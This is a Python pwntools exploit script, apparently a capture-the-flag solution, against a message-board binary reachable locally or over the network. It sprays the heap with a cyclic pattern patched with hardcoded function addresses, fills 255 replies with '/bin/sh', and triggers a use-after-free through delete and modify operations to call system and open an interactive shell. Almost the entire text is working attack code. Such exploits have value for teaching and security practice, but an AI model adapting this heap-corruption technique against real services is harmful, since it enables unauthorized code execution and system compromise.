#!/usr/bin/env python
from pwn import *
import time, hashlib
context(os='linux',arch='i386')

# If a HOST is given on the cmdline, then assume that it is already running there
if 'HOST' in pwn.args:
    HOST = pwn.args['HOST']
    PORT = int(pwn.args.get('PORT', 7777))
    p = remote(HOST, PORT)
else:
    # Otherwise start the binary locally
    p = process('./7b80d4d56c282a310297336752c589b7')

# Commands on main page
obj_write = '1'
obj_read = '2'
obj_quit = '3'

rec_del = '1'
rec_mod = '2'
rec_reply = '3'
rec_back = '4'

def write(content=''):
    write.count += 1

    p.sendline(obj_write)
    p.sendline('author_%04i----' % write.count)
    p.sendline('title_%04i-----' % write.count)
    p.sendline(content)

    return write.count
write.count = 0

def reply(obj_id, reply_id):
    p.sendline(obj_read)
    p.sendline(str(obj_id))
    p.sendline(rec_reply)
    # We really only need one specific reply to have /bin/sh in it,
    # but it's easier to just do all of them.
    p.sendline('/bin/sh') # 'reply_%04i' % reply_id)
    p.sendline(rec_back)

def modify(obj_id):
    p.sendline(obj_read)
    p.sendline(str(obj_id))
    p.sendline(rec_mod)
    p.sendline('author_%04i----' % obj_id)
    p.sendline('title_%04i-----' % obj_id)
    p.sendline(rec_back)

def delete(obj_id):
    p.sendline(obj_read)
    p.sendline(str(obj_id))
    p.sendline(rec_del)
    p.sendline(rec_back)

# Use a cyclic pattern as the base of our spray for trouble-
# shooting purposes, and patch in the addresses we need at
# the correct locations.
cyclic  = cyclic(8000)
do_free = p32(0x80487C4)
system  = p32(0x8048630)
offsets = {
    'jaaa': do_free,
    'zaah': do_free,
    'iaah': system
}

# Comment this loop out to see where the crashes
for pat,addr in offsets.items():
    off    = cyclic_find(pat)
    cyclic = cyclic[:off] + addr + cyclic[off+4:]

# Heap spray
write() # needed for spray->prev
spray = write(cyclic)
write() # needed for spray->next and sploit->prev

# Create enough replies so that the total is 0x100
map(lambda x: reply(spray, x), range(255))

# raw_input("Press enter to delete first object")
delete(spray)

# New thread
sploit = write()
write() # sploit->next

map(lambda x: reply(sploit, x), range(255))

# raw_input("Press enter to delete second object")
modify(sploit)
delete(sploit)

data = p.recvrepeat()
while data:
    data = p.recvrepeat()
    time.sleep(1)

p.interactive()
